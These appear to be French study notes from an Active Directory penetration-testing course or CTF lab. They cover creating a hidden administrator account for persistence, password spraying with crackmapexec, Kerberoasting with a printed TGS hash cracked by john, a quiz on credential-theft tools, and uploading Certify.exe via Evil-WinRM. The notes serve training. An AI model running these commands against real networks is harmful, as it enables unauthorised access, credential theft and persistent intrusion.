## Maintenez un accès dans l’environnement compromis
Lorsque vous avez pris la main sur une machine, il peut être intéressant d’y ajouter une persistance pour pouvoir revenir dessus plus tard. En effet, si vous avez exploité une vulnérabilité propre à la machine, les équipes de sécurité peuvent potentiellement avoir détecté votre intrusion et mis à jour la machine dans la foulée. Il serait alors pertinent de garantir votre accès pour éviter de devoir tout refaire !
- **Créez un compte à privilèges**
Une technique simple et efficace consiste à ajouter un nouvel utilisateur local à la machine compromise. Après avoir créé cet utilisateur, vous l'ajouterez au groupe d’administration. De cette manière, vous pourrez vous connecter à cette machine via ce compte, en utilisant les outils légitimes, comme RDP ou WinRM.
```
net user evil p4ssw0rd /add
net localgroup Administrateurs evil /add
```
- Notez que dans cet exemple, nous ajoutons le compte evil au groupe local `Administrateurs`. Cela fonctionne parce que la machine compromise est configurée en français. Si vous êtes sur une machine anglaise, vous devrez changer le nom du groupe local en `Administrators`. La reconnaissance que vous aurez faite au préalable sur cette machine vous permettra de découvrir la langue du système d’exploitation compromis.



## Compétences évaluées
PasswordSpray
```
┌──(root㉿hacker101)-[/home/bloman/CTFs/Boot2root/RootMe]
└─# crackmapexec smb 212.129.29.186 -u users.txt -p 'Welcome123' --no-brute --continue-on-success
SMB         212.129.29.186  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:medic.ex) (signing:False) (SMBv1:False)
SMB         212.129.29.186  445    DC01             [-] medic.ex\malves:Welcome123 STATUS_LOGON_FAILURE 
SMB         212.129.29.186  445    DC01             [-] medic.ex\snoel:Welcome123 STATUS_LOGON_FAILURE 
SMB         212.129.29.186  445    DC01             [+] medic.ex\eleleu:Welcome123 
```
Avec les comptes que vous avez compromis, vous pouvez lister les comptes utilisateurs de l’Active Directory de MedicEx qui ont leur attribut SPN non vide, en vue de faire une attaque de type Kerberoasting. En utilisant l’outil `GetUserSPNs.py` d’Impacket, vous pouvez les identifier. Quel utilisateur fait partie de cette liste, et quel est son mot de passe ?

```
└─# GetUserSPNs.py medic.ex/lpoirier:Welcome123 -dc-ip 212.129.29.186 -request
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName  Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  -------  --------  --------------------------  ---------  ----------
SQL/SQL01             svc_sql            2022-07-02 18:00:09.199337  <never>               
WWW/INTRANET01        svc                2022-07-02 18:00:09.308719  <never>               

$krb5tgs$23$*svc$MEDIC.EX$medic.ex/svc*$2fd0d6eb46e49cafed8a69864a87b238$c308d6ea88eb791d4c07d67860d9287e7f96f8f6dc5ca9fca0bfa71e09abd1f70dcc6b1018633c329208d41a393cc2daac8949de28ec1090acf1af7078372858f2a001fb81e514ba46b37d6dcefd315ea4b13b159afa616fd5bc27074368903e31a9dd4934d575b167f019ce464b2dee5a8686bae2cce1099286f9433cd0159c25afc8e04355277e1fda33831c06fabb7d15d724d23fdf1f15321ccbe47a3f68e60c1cc58d20fa3a7efb32e8397f1d313affb23e31be8ad2baf2c3d1098ca54a3688a16a038a993c0ad4daffd5ff940d81dba7b73ee45014e399f90e0032403b0161c374d0a0d03b8a6c6f371864a5a090ef6d6c9456b7c45685faa3a278fe2e6ecb73b6e7f2f691a137540f9e59fc429d7a1eb574735381077cfcd1cef8d3277c41d50884d9179aff9a9c76e0f670bd9a9e0fbc1b8530e85f67dcb2465f6bff613f52b4dd71fb645a500e65f6ccc61467580ef7f710a7626ac90ec90620c5a695abbaf6533bf87e8a7babc59a72ba943b34aff5775958d10d18bf19614f4062c8d1aa64bfd804dc4a207b75545772d721bcfee03af7b49bb62e6d60bc8ef09a47a33a5d3662256a612b4353a8b4ccaff3da6cc37587a3e4f302a02ab296fa99a06175e3c1f331134ff5f6236e99835ba954bd0c8fc89d23e65c82b25393b4eefae799fc0eab49afae5efe0024729a589403aac7d20f6304eb39fa52014c5a0d47cf954d8d8d25a4903e7f09b9dc450b43ecf718df5ecf8ee217b614a38ec4497e5022d633a50370a8f1938f5ec22ed7d40f17796792101c701b567a2b09d36cdf68b33ef894b1802281d1cb842e50affe25fbd34701af6a4f386408d05915083ba0eaba4c6f9b941657541f222cd45c766d6c6836c7dfbdcc2e5d7818dea2bf7fc66bf446f64fe0e182c6dbeaa32ffed9124826601e67d5f23f4f9ab6fd8cdc2d0850b7b62874ea801f40021ba1ad818c8b3625fed92c70beb7d9d562e6999e1d4c2efe7120202427dedb8b16302df660b39a4b5730d7ebc72c74312a379be157ed06d84d72508e29e49190058fdc17e302c83849da981a23063edc600be5c3eaa5fa95fd13d7e33d44050a68a3a63d9972db2a5de3f318ff0395159183018fa4ea0f2a5cb5bb95a7a19b53ef6c487ed9789eb3cdd85974c27b8d42e7029dbec0f9314932b88e085d748721731d5278853d8b279578777ed09e438e3ba12718e708400fd9230d4487234855cb81f1255336a42358345c16e5322c38cbe6f8b630a289b8d8bd6950155e3abe4f19e4d78a3036ae142dce3ba7899eb02a6e24e53c5bdc6ff5c64098decd3267df2038b14f64a1e1e02176b5be9a14a9ff7dd1d876c6b385044c148b15

└─# john krb.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P4ssw0rd         (?)     
1g 0:00:00:00 DONE (2024-02-20 00:14) 1.282g/s 561887p/s 561887c/s 561887C/s STAR22..MARLENI
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Le poste que vous avez compromis est celui d’un administrateur système. Vous êtes administrateur local de ce poste. Vous allez effectuer une nouvelle phase de reconnaissance pour :

   - découvrir qui utilise ce poste ; 
   - chercher d’éventuels documents.

Mais vous cherchez également de nouveaux identifiants pour rebondir ou élever vos privilèges sur le domaine. Que pouvez-vous faire pour cela ?
-Je peux utiliser l’outil DonPAPI pour découvrir des identifiants enregistrés dans Chrome via DPAPI, qui me permettront peut-être d’avoir un accès sur un équipement d’administration, comme une console vSphere ou un pare-feu.
- Je peux utiliser l’outil lsassy pour extraire les clés Wi-Fi du processus lsass du poste, afin de découvrir peut-être un Wi-Fi d’administration qui me donnera accès à d’autres réseaux.
- Je peux utiliser l’outil Group3r qui me permettra peut-être d’extraire des identifiants dans les GPO appliquées sur ce poste, notamment le mot de passe de l’administrateur local.




## Hacking PKI
- https://github.com/depradip/Ghostpack_CompiledBinaries/tree/main/Ghostpack-CompiledBinaries

```
*Evil-WinRM* PS C:\Users\Raven\Documents> upload /home/bloman/tools/Windows/Certify.exe

*Evil-WinRM* PS C:\Users\Raven\Documents> .\Certify.exe find /vulnerable

```